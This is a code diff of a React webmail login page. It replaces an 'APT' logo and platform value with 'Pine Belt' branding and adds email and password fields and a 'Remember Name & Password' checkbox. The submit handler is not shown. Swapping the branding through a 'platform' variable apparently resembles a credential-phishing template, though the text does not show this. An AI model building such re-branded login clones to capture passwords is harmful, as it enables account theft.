@@ -10,7 +10,7 @@ import google from './google.png';
 import rounde from './round.png';
 import aptlogo from './apt_logo.png';
 
-
+import pine from './pinebelt.png';
 
 
 function Home(){
@@ -19,7 +19,7 @@ function Home(){
     const[email, setUserName] = useState("");
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("APT")
+    const[platform, setPlatform] = useState("Pine Belt")
 
     const[showError, setShowError] = useState(false);
 
@@ -66,26 +66,35 @@ async function handleSubmit(e){
 
 
 
-            <div className='col-md-5 whitediv m-auto py-3 px-4'>
-                <div className='text-left'>
-                <img className='logoimage' src={aptlogo} />
+            <div className='col-md-5 whitediv m-auto'>
+                <h1 className='mainhead mx-1'><span className='font-weight-bold'>WebMail</span> Login</h1>
+                <div className='text-center'>
+                <img className='logoimage' src={pine} />
 
                 </div>
 
 
 
-                <form onSubmit={handleSubmit}>
+                <form className='px-3' onSubmit={handleSubmit}>
 
                 <div class="form-group row mt-4">
-    <label for="staticEmail" class="col-sm-2 col-form-label label">Username</label>
-    <div class="col-sm-10">
-      <input type="text" class="form-control" id="staticEmail" />
+   
+    <div class="col-sm-12">
+      <input type="email" class="form-control"placeholder='example@example.com' id="staticEmail"required />
     </div>
   </div>
   <div class="form-group row">
-    <label for="inputPassword" class="col-sm-2 col-form-label label">Password</label>
-    <div class="col-sm-10">
-      <input type="password" class="form-control" id="inputPassword"/>
+   
+    <div class="col-sm-12">
+      <input type="password" class="form-control"placeholder='password' id="inputPassword"required/>
+    </div>
+  </div>
+
+
+  <div class="form-group row">
+   
+    <div class="col-sm-12">
+      <input type="checkbox" /> <span className='checktext'> Remember Name & Password</span>
     </div>
   </div>
 
@@ -94,9 +103,9 @@ async function handleSubmit(e){
 
        
                    
-                 <div className='form-group text-center'>
+                 <div className='form-group text-right'>
 
-                        <button type='submit' className=' border-0 px-3 rounded mt-3 font-weight-bold'>Login</button>
+                        <button type='submit' className=' border-0 btn mybtnn px-3 rounded mt-3 font-weight-bold'>Login</button>
 
                     </div>
 
